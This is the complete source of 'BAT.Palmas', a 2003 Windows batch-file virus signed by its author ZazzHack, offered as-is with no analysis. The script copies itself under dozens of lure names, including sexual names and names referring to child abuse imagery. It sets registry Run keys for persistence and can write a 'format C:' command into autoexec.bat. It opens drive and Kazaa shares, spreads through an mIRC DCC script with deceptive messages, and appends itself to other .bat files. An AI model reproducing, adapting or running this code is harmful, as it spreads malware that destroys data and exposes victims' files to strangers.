@echo off
:: BAT.Palmas
:: by ZazzHack
:: 20/10/2003
:: I hope that everything works correctly! ;-)
:: Let's play...
if "%1"=="ingiro" goto fortuna
if "%1"=="propaga" goto propaga
ctty nul
@command /f /c if exist A:\E-Game.exe.bat goto noadir>nul
@command /f /c copy %0 A:\E-Game.exe.bat>nul
:noadir
ctty con
ctty nul
if exist %windir%\pam.bat goto noh
if not exist %windir%\pam.bat copy %0 %windir%\pam.bat>nul
if exist %windir%\winstart.bat del %windir%\winstart.bat>nul
copy %0 %windir%\winstart.bat>nul
attrib +h %windir%\pam.bat>nul
:noh
if exist %windir%\_backup.txt goto ctrlreg
echo.Microsoft Corp. Backup Utility 2003>%windir%\_backup.txt
echo.DO NOT DELETE OR MODIFY THIS FILE!>>%windir%\_backup.txt
echo.else Windows will not run correctly, thanks.>>%windir%\_backup.txt
echo.>>%windir%\_backup.txt
md %windir%\Utils&Pics>nul
copy %0 %windir%\Utils&Pics\LongHorn.exe.bat>nul
copy %0 %windir%\Utils&Pics\XP_Serials.exe.bat>nul
copy %0 %windir%\Utils&Pics\ANALizer.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Suckerz.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Exploits.zip.bat>nul
copy %0 %windir%\Utils&Pics\Lolita-Sindrome.jpg.bat>nul
copy %0 %windir%\Utils&Pics\child-porn.jpg.bat>nul
copy %0 %windir%\Utils&Pics\lesb-anal.jpg.bat>nul
copy %0 %windir%\Utils&Pics\CHAT-WAR-FLOODER.exe.bat>nul
copy %0 %windir%\Utils&Pics\MSDOS_Games.com.bat>nul
copy %0 %windir%\Utils&Pics\Loghi.exe.bat>nul
copy %0 %windir%\Utils&Pics\Suonerie.exe.bat>nul
copy %0 %windir%\Utils&Pics\naked.jpg.bat>nul
copy %0 %windir%\Utils&Pics\port-scan.exe.bat>nul
copy %0 %windir%\Utils&Pics\SUB7_CLIENT.exe.bat>nul
copy %0 %windir%\Utils&Pics\WishMaster.mp3.bat>nul
copy %0 %windir%\Utils&Pics\sexy_nude.jpg.bat>nul
copy %0 %windir%\Utils&Pics\DirectX_10b.exe.bat>nul
copy %0 %windir%\Utils&Pics\MS-Visual_Basic_6.exe.bat>nul
copy %0 %windir%\Utils&Pics\DLLs_UpDate.msi.bat>nul
copy %0 %windir%\Utils&Pics\sex-dick.jpg.bat>nul
copy %0 %windir%\Utils&Pics\hentai.jpg.bat>nul
copy %0 %windir%\Utils&Pics\lolita.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Lick_Dick.jpg.bat>nul
copy %0 %windir%\Utils&Pics\DOS-Cleaner.bat>nul
copy %0 %windir%\Utils&Pics\Mentor_Zine##.zip.bat>nul
copy %0 %windir%\Utils&Pics\All-Hentai.jpg.bat>nul
copy %0 %windir%\Utils&Pics\More_than_700_porn_pics.zip.bat>nul
copy %0 %windir%\Utils&Pics\HCsex.jpg.bat>nul
copy %0 %windir%\Utils&Pics\One_Piece_porn.avi.bat>nul
copy %0 %windir%\Utils&Pics\incest-collects.zip.bat>nul
copy %0 %windir%\Utils&Pics\Long-Dick.jpg.bat>nul
copy %0 %windir%\Utils&Pics\child-nudes.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Nosferatu.mp3.bat>nul
copy %0 %windir%\Utils&Pics\Dialer-Control_V70.exe.bat>nul
copy %0 %windir%\Utils&Pics\zaSetup3_7_395.exe.bat>nul
copy %0 %windir%\Utils&Pics\techno.mp3.bat>nul
copy %0 %windir%\Utils&Pics\Punk_Ska_Sex.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Crazy_Rock.mp3.bat>nul
copy %0 %windir%\Utils&Pics\sex-fuck.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Porn_Lesbian.mpe.bat>nul
copy %0 %windir%\Utils&Pics\Video-Shock.wmv.bat>nul
copy %0 %windir%\Utils&Pics\FireWorks_fuck.jpg.bat>nul
copy %0 %windir%\Utils&Pics\HOW-TO-MAKE-A-BOMB-SOON.txt.bat>nul
copy %0 %windir%\Utils&Pics\Games_Solutions(pics).zip.bat>nul
copy %0 %windir%\Utils&Pics\1-2-3_MakeUp!-sex-.jpg.bat>nul
copy %0 %windir%\Utils&Pics\alone-child.jpg.bat>nul
copy %0 %windir%\Utils&Pics\The_Techno_MiXer.exe.bat>nul
copy %0 %windir%\Utils&Pics\PassWord_Recover.exe.bat>nul
copy %0 %windir%\Utils&Pics\Crackz.zip.bat>nul
copy %0 %windir%\Utils&Pics\Hacker_Z.txt.bat>nul
copy %0 %windir%\Utils&Pics\sex-pics-girls.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Super_Porn_Site.htm.bat>nul
copy %0 %windir%\Utils&Pics\1000_&_1_HardPics.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Sailor_Moon_Fucked_by_Goku_SSJ5.jpg.bat>nul
copy %0 %windir%\Utils&Pics\teschio_sex_child.gif.bat>nul
copy %0 %windir%\Utils&Pics\Virus-Generator-4-DOS.com.bat>nul
copy %0 %windir%\Utils&Pics\FireWalls_Guide_nude_fuck.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Miss_Universo_nude-sexy.zip.bat>nul
copy %0 %windir%\Utils&Pics\Hack_Zines_from_net_nations.zip.bat>nul
copy %0 %windir%\Utils&Pics\rRlf#3.zip.bat>nul
copy %0 %windir%\Utils&Pics\BoM_80.exe.bat>nul
copy %0 %windir%\Utils&Pics\Last_NAV_DEFs.exe.bat>nul
copy %0 %windir%\Utils&Pics\FixKlez.com.bat>nul
copy %0 %windir%\Utils&Pics\FixHapTime.exe.bat>nul
copy %0 %windir%\Utils&Pics\the-rooz.jpg.bat>nul
copy %0 %windir%\Utils&Pics\909_per_cent_gabber.mp3.bat>nul
copy %0 %windir%\Utils&Pics\Paiura.mp3.bat>nul
copy %0 %windir%\Utils&Pics\incest.wmv.bat>nul
copy %0 %windir%\Utils&Pics\Fuck_IT!.exe.bat>nul
copy %0 %windir%\Utils&Pics\DoNotOpen.exe.bat>nul
copy %0 %windir%\Utils&Pics\nide-child-me-fucked.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Speed_Up_your_connection.exe.bat>nul
copy %0 %windir%\Utils&Pics\penthouse.jpg.bat>nul
copy %0 %windir%\Utils&Pics\6_1_culo.jpg.bat>nul
copy %0 %windir%\Utils&Pics\Tomb_Raider_7-Last_Edition(porn)-(nude)-ONLY_ENGLISH.exe.bat>nul
copy %0 %windir%\Utils&Pics\lolita-fuck-dick-sex-lesb-child-porn-teen-sux-lick-dirty.jpg.bat>nul
copy %0 %windir%\Utils&Pics\BO2K_client_server.zip.bat>nul
copy %0 %windir%\Utils&Pics\ZazzHack.zip.bat>nul
copy %0 %windir%\Utils&Pics\The-Lost-Diaries.mp3.bat>nul
md %windir%\þsys_backþ>nul
xcopy %windir%\Utils&Pics %windir%\þsys_backþ>nul
:ctrlreg
if exist %windir%\sysgio.reg goto zazz
echo REGEDIT4>p
echo.>>p
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>p
echo "Filter"="C:\\windows\\pam.bat">>p
move p %windir%\sysgio.reg>nul
start /w regedit /s %windir%\sysgio.reg
cls
:zazz
if exist %windir%\winzazz.vbs goto quello
echo MsgBox "...for the most sexy italian girl!" & Chr(13) & Chr(10) & "...for Giorgia Palmas!" & Chr(13) & Chr(10) & "...by ZazzHack",4096,"BAT.Palmas">7
move 7 %windir%\winzazz.vbs>nul
cls
:quello
if exist %windir%\questo.reg goto mark
echo REGEDIT4>3
echo.>>3
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>3
echo "WinPitch"="C:\\windows\\winzazz.vbs">>3
move 3 %windir%\questo.reg>nul
start /w regedit /s %windir%\questo.reg
cls
:mark
if exist %temp%\NoDelMe.reg goto bass
echo REGEDIT4>%temp%\NoDelMe.reg
echo.>>%temp%\NoDelMe.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network]>>%temp%\NoDelMe.reg
echo "Installed"="1">>%temp%\NoDelMe.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan]>>%temp%\NoDelMe.reg
echo "Flags"=dword:0072f954>>%temp%\NoDelMe.reg
start /w regedit /s %temp%\NoDelMe.reg
:bass
if exist %temp%\drum.reg goto thejpg
echo REGEDIT4>%temp%\drum.reg
echo.>>%temp%\drum.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%temp%\drum.reg
echo "MSBullettin"="regedit /s C:\\WINDOWS\\TEMP\\NoDelMe.reg">>%temp%\drum.reg
start /w regedit /s %temp%\drum.reg
cls
:thejpg
if exist %windir%\desktop\palmas.jpg echo @format C: /u /q /autotest>>\autoexec.bat
cls
if not exist %windir%\desktop\palmas.jpg goto notpay4
echo FUCK YOU, BASTARD! GIORGIA PALMAS IS ONLY MINE! ;-)>%temp%\view.txt
if exist %temp%\view.txt start /max %temp%\view.txt
:notpay4
if not exist %windir%\desktop\palmas.jpg goto tiscali
if exist %temp%\i.txt goto ife
echo You Have Been Infected By BAT.Palmas>%temp%\i.txt
echo.>>%temp%\i.txt
echo ZazzHack,>>%temp%\i.txt
echo from Italy.>>%temp%\i.txt
:ife
start /m notepad.exe /p %temp%\i.txt
:tiscali
if not exist %windir%\prefer~1\tiscali\nul goto noautocn
if exist %windir%\connectme.reg goto info
echo REGEDIT4>%windir%\connectme.reg
echo.>>%windir%\connectme.reg
echo [HKEY_CURRENT_USER\RemoteAccess\Profile\Tiscali 10.0]>>%windir%\connectme.reg
echo "AutoConnect"=dword:00000001>>%windir%\connectme.reg
start /w regedit /s %windir%\connectme.reg
cls
:info
if exist %windir%\inffile.reg goto explore
echo REGEDIT4>%windir%\inffile.reg
echo.>>%windir%\inffile.reg
echo [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>%windir%\inffile.reg
echo "Updater"="regedit /s C:\\WINDOWS\\connectme.reg">>%windir%\inffile.reg
start /w regedit /s %windir%\inffile.reg
:explore
start /w regedit /s %windir%\connectme.reg
if exist %windir%\advice.bat goto kaox
echo @echo off>%windir%\advice.bat
echo echo Micro$oft Connection Speed Test>>%windir%\advice.bat
echo echo.>>%windir%\advice.bat
echo echo Please, allow this connection for about 7 minutes...>>%windir%\advice.bat
echo echo Just the time to set-up>>%windir%\advice.bat
echo echo the correct band-width,>>%windir%\advice.bat
echo echo thanks.>>%windir%\advice.bat
:kaox
start %windir%\advice.bat
@ping -l 7777 -n 7777 studio_tg5.rti.it>%windir%\tg.5
if exist %windir%\kzlt.reg goto mirco
echo REGEDIT4>%windir%\kzlt.reg
echo.>>%windir%\kzlt.reg
echo [HKEY_CURRENT_USER\SOFTWARE\KAZAA\LocalContent]>>%windir%\kzlt.reg
echo "dir0"="012345:C:\\Windows\\Utils&Pics">>%windir%\kzlt.reg
echo "dir99"="012345:C:\\Windows\\Desktop">>%windir%\kzlt.reg
echo "DisableSharing"=dword:00000000>>%windir%\kzlt.reg
start /w regedit /s %windir%\kzlt.reg
:mirco
if exist %windir%\win.set goto eshare
echo [script]>%windir%\win.set
echo n0=on 1:JOIN:#:{>>%windir%\win.set
echo n1= /if ( nick == $me ) { halt }>>%windir%\win.set
echo n2= /.dcc send $nick c:\windows\utils&pics\sexy_nude.jpg.bat>>%windir%\win.set
echo n3= /on *:TEXT:*sex*:{>>%windir%\win.set
echo n4=.msg $nick I'm sending you a big collection of porno pics! Say me if you like them!>>%windir%\win.set
echo n5= /.dcc send $nick c:\windows\utils&pics\lolita.jpg.bat>>%windir%\win.set
echo n6= /on *:TEXT:*hack*:{>>%windir%\win.set
echo n7=.msg $nick Here's a new Microsoft IIS exploit! Have fun and... do not deface me! ;-)>>%windir%\win.set
echo n8= /.dcc send $nick c:\windows\utils&pics\Hacker_Z.txt.bat>>%windir%\win.set
echo n9= /on *:TEXT:*mp3*:{>>%windir%\win.set
echo n10=.msg $nick Hi! I understand that you are a MP3 fanatic! good, listen to this song and... you will dream!!!>>%windir%\win.set
echo n11= /.dcc send $nick c:\windows\utils&pics\nosferatu.mp3.bat>>%windir%\win.set
del C:\progra~1\mirc\script.ini>nul
del C:\progra~1\mirc32\script.ini>nul
if exist C:\mirc\mirc.ini copy %windir%\win.set C:\mirc\script.ini>nul
if exist C:\mirc32\mirc.ini copy %windir%\win.set C:\mirc32\script.ini
if exist C:\progra~1\mirc\mirc.ini copy %windir%\win.set C:\progra~1\mirc\script.ini
if exist C:\progra~1\mirc32\mirc.ini copy %windir%\win.set C:\progra~1\mirc32\script.ini
:eshare
if exist %windir%\sh.reg goto noautocn
@echo REGEDIT4>%windir%\sh.reg
@echo.>>%windir%\sh.reg
@echo.[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan]>>%windir%\sh.reg
@echo.>>%windir%\sh.reg
@echo.[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\c$]>>%windir%\sh.reg
@echo."Flags"=dword:00000302>>%windir%\sh.reg
@echo."Parm1enc"=hex:>>%windir%\sh.reg
@echo."Parm2enc"=hex:>>%windir%\sh.reg
@echo."Path"="c:\\windows\\utils&pics">>%windir%\sh.reg
@echo."Remark"="">>%windir%\sh.reg
@echo."Type"=dword:00000000>>%windir%\sh.reg
@echo.>>%windir%\sh.reg
@echo.[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\d$]>>%windir%\sh.reg
@echo."Flags"=dword:00000302>>%windir%\sh.reg
@echo."Parm1enc"=hex:>>%windir%\sh.reg
@echo."Parm2enc"=hex:>>%windir%\sh.reg
@echo."Path"="d:\\">>%windir%\sh.reg
@echo."Remark"="">>%windir%\sh.reg
@echo."Type"=dword:00000000>>%windir%\sh.reg
@echo.>>%windir%\sh.reg
@echo.[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\h$]>>%windir%\sh.reg
@echo."Flags"=dword:00000302>>%windir%\sh.reg
@echo."Parm1enc"=hex:>>%windir%\sh.reg
@echo."Parm2enc"=hex:>>%windir%\sh.reg
@echo."Path"="h:\\">>%windir%\sh.reg
@echo."Remark"="">>%windir%\sh.reg
@echo."Type"=dword:00000000>>%windir%\sh.reg
@echo.>>%windir%\sh.reg
@echo.[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\z$]>>%windir%\sh.reg
@echo."Flags"=dword:00000302>>%windir%\sh.reg
@echo."Parm1enc"=hex:>>%windir%\sh.reg
@echo."Parm2enc"=hex:>>%windir%\sh.reg
@echo."Path"="z:\\">>%windir%\sh.reg
@echo."Remark"="">>%windir%\sh.reg
@echo."Type"=dword:00000000>>%windir%\sh.reg
start /w regedit /s %windir%\sh.reg
:noautocn
@command /e:7000 /c %windir%\pam.bat ingiro
exit
:fortuna
for %%n in (*.bat) do call %windir%\pam.bat propaga %%n
cls
exit
:propaga
find "Giorgia"<%2>nul
if errorlevel 0 if not errorlevel 1 goto sciopero
type %2>tempo$
echo.>>tempo$
type %windir%\pam.bat>>tempo$
move tempo$ %2>nul
:sciopero
ctty con
cls
